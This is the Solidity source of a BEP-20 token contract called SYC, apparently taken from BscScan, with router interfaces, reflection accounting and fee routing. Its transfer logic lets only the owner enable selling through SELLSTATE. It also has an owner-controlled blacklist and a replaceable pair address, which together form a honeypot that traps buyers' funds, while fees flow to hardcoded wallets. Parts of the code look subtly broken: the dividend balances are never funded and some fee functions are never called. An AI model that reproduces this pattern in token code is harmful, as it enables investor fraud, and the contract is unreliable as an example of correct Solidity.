/**
 *Submitted for verification at BscScan.com on 2022-11-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SYCToken is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private buyAmount;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => address) public inviter;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _blackList;
    mapping(address => bool) private _updated;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;

    string private _name;
    string private _symbol;
    uint256 private _decimals;

    uint256 public _liquidityFee = 0;//add lp
    uint256 public _LPFee = 30;//lp rewards
    uint256 public _inviterFee = 0;//referral lv5

    uint256 public _marketFee = 10;//nft holding rewards
    uint256 public _marketFee1 = 15;// 
    uint256 public _marketFee2 = 20;// 
    uint256 public _destroyFee = 25;

    uint256 private minTotal = 10000 * 1e18;//burn

    uint256 private destroyTotal;

    uint256 private percent = 1000;
    uint256 private SELLSTATE = 0;
    address public _marketAddress= 
        address(0x34E38184fA3DCE35524397764ADcEA56e3d091cB);

    address public _marketAddress1= 
    address(0xB2D0dA78D68773731f685Cc2A91015Db2eeeBFa7);

    address public _marketAddress2= 
    address(0xf633600c6f0DDd9ab1187f0E9CBc48032d409d4d);

    address private _destroyAddress =
        address(0x000000000000000000000000000000000000dEaD);

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;

    uint256 distributorGas = 500000;
    uint256 public minPeriod = 1 hours;
    uint256 public LPFeefenhong;
    uint256 currentIndex;

    bool inSwapAndLiquify;
    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    
    IUniswapV2Router02 public immutable uniswapV2Router;

    address public uniswapV2Pair;
    
    // constructor(address _route,address _usdtToken) {
       constructor(address _route) {
        _name = "SYC";
        _symbol = "SYC";
        _decimals = 18;

       IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_route);
       uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
       .createPair(address(this), _uniswapV2Router.WETH());
       uniswapV2Router = _uniswapV2Router;

        //  IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_route);
        // uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        // .createPair(address(this), _usdtToken);
        //uniswapV2Router = _uniswapV2Router;
        
        _tTotal = 9433 * 10**_decimals;
        _rTotal = (MAX - (MAX % _tTotal));
		
        _mint(msg.sender, _rTotal,_tTotal);
		
        
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(this)] = true;
        _owner = msg.sender;
    }

    function name() public view returns (string memory) {
        return _name;
    }
    
    function isRobot(address account) public view returns (bool) {
        return _blackList[account];
    }
    function setSellstate(uint256 _sellstate) public onlyOwner {
        SELLSTATE = _sellstate;
    }
    

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function getMaxSell(uint256 tAmount, address sender) public view  returns (bool) {
        return tAmount <= IERC20(this).balanceOf(sender);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {

		_transfer(sender, recipient, amount);
		
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
    
    function add2Robot(address account) public onlyOwner {
        _blackList[account] = true;
    }

    function remove2Robot(address account) public onlyOwner {
        _blackList[account] = false;
    }
    
    

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _transfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        
        require(!_blackList[sender]);
        
        if(sender != uniswapV2Pair && sender != address(uniswapV2Router) && balanceOf(recipient) == 0 && inviter[recipient] == address(0)) {
            inviter[recipient] = sender;
        }
        
		if(sender == uniswapV2Pair) {//BUY
            if(_tOwned[address(this)] >= 1 * 10**5 * 10**9 && sender !=address(this) && LPFeefenhong.add(minPeriod) <= block.timestamp) {
                process(distributorGas) ;
                LPFeefenhong = block.timestamp;
            }
            setShare(sender);
            _tokenSellTransferFee(sender, recipient, tAmount);

        } else if(recipient == uniswapV2Pair) {//SELL
            require(SELLSTATE>0, "SELLSTATE must be greater than zero");
            if(_tOwned[address(this)] >= 1 * 10**5 * 10**9 && sender !=address(this) && LPFeefenhong.add(minPeriod) <= block.timestamp) {
                process(distributorGas) ;
                LPFeefenhong = block.timestamp;
            }
            setShare(sender);
            _tokenSellTransferFee(sender, recipient, tAmount);
            
        } else{

            uint256 currentRate = _getRate();
            uint256 rAmount = tAmount.mul(currentRate);
            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _rOwned[recipient] = _rOwned[recipient].add(rAmount);
            
            emit Transfer(sender, recipient, tAmount);
        }
        
        
    }
    
    function _tokenSellTransferFee(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
		
		bool fee = true;
		if(_isExcludedFromFee[recipient]){
            fee = false;
        }
        
		
		if(fee){
		
			uint256 allFee;
			 _takeTransfer(
    			sender,
    			address(this),
    			tAmount.div(percent).mul(_LPFee),
    			currentRate
    			);

            allFee = allFee + _LPFee;//lp rewards

              _takeTransfer(
				sender,
				_marketAddress,
				tAmount.div(percent).mul(_marketFee),
				currentRate
			);

            allFee = allFee + _marketFee;

         _takeTransfer(
				sender,
				_marketAddress1,
				tAmount.div(percent).mul(_marketFee1),
				currentRate
			);

            allFee = allFee + _marketFee1;

                 _takeTransfer(
				sender,
				_marketAddress2,
				tAmount.div(percent).mul(_marketFee2),
				currentRate
			);

            allFee = allFee + _marketFee2;
            
            _takeTransfer(
				sender,
				_destroyAddress,
				tAmount.div(percent).mul(_destroyFee),
				currentRate
			);

            allFee = allFee + _destroyFee;
            
		    
		    _rOwned[recipient] = _rOwned[recipient].add(rAmount.div(percent).mul(percent-allFee));
            emit Transfer(sender, recipient, tAmount.div(percent).mul(percent-allFee));
			
            
		} else {
		    _rOwned[recipient] = _rOwned[recipient].add(rAmount);
            emit Transfer(sender, recipient, tAmount);
		}
			
        
    }
    
    
    function _tokenBuyTransferFee(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {

        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
		
		bool fee = true;
		if(_isExcludedFromFee[sender]){
            fee = false;
        }
        
		
		if(fee){
            uint256 allFee;

              _takeTransfer(
				sender,
				_marketAddress,
				tAmount.div(percent).mul(_marketFee),
				currentRate
			);

            allFee = allFee + _marketFee;

         _takeTransfer(
				sender,
				_marketAddress1,
				tAmount.div(percent).mul(_marketFee1),
				currentRate
			);

            allFee = allFee + _marketFee1;

            

            _rOwned[recipient] = _rOwned[recipient].add(rAmount.div(percent).mul(percent-allFee));
            emit Transfer(sender, recipient, tAmount.div(percent).mul(percent-allFee));

            
		} else {
		    _rOwned[recipient] = _rOwned[recipient].add(rAmount);
            emit Transfer(sender, recipient, tAmount);
		}
			
        
    }
    
      function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0)return;
        uint256 nowbanance = _tOwned[address(this)];
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }
            uint256 lpTotalSupply = IERC20(uniswapV2Pair).totalSupply();
            uint256 addr1lp = IERC20(uniswapV2Pair).balanceOf(address(1));
            uint256 amount = nowbanance.mul(IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex])).div(lpTotalSupply.sub(addr1lp));
         if( amount < 1 * 10**9) {
             currentIndex++;
             iterations++;
             return;
         }
         if(_tOwned[address(this)]  < amount )return;
            distributeDividend(shareholders[currentIndex],amount);
            
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
   

    function distributeDividend(address shareholder ,uint256 amount) internal {
            
            _tOwned[address(this)] = _tOwned[address(this)].sub(amount);
            _tOwned[shareholder] = _tOwned[shareholder].add(amount);
             emit Transfer(address(this), shareholder, amount);
    }

    function setShare(address shareholder) private {
           if(_updated[shareholder] ){      
                if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) quitShare(shareholder);              
                return;  
           }
           if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;  
            addShareholder(shareholder);
            _updated[shareholder] = true;
          
      }
    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }
    function quitShare(address shareholder) private {
           removeShareholder(shareholder);   
           _updated[shareholder] = false; 
      }
    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
    
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }
    
	function _takeInviterFee(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 currentRate
    ) private returns(uint256){

        address cur;
        if (sender == uniswapV2Pair) {
            cur = recipient;
        } else {
            cur = sender;
        }
        uint256 ratesum = 0;
        for (uint256 i = 0; i < 5; i++) {
            uint256 rate;

            if (i == 0) {
                rate = 30;
            } else {
                rate = 10;
            }
            
            cur = inviter[cur];
            if (cur == address(0)) {
                break;
            }else{
                ratesum = ratesum+ rate;
            }

            uint256 curTAmount = tAmount.div(percent).mul(rate);
            uint256 curRAmount = curTAmount.mul(currentRate);
            _rOwned[cur] = _rOwned[cur].add(curRAmount);
            emit Transfer(sender, cur, curTAmount);
        }
        return ratesum;
    }
	
    
    function _mint(address account, uint256 ramount, uint256 tamount) internal {
		_rOwned[account] = ramount;
        emit Transfer(address(0), account, tamount);
    }
    function changeUniswapV2Pair(address pair) public onlyOwner {
        uniswapV2Pair = pair;
    }

}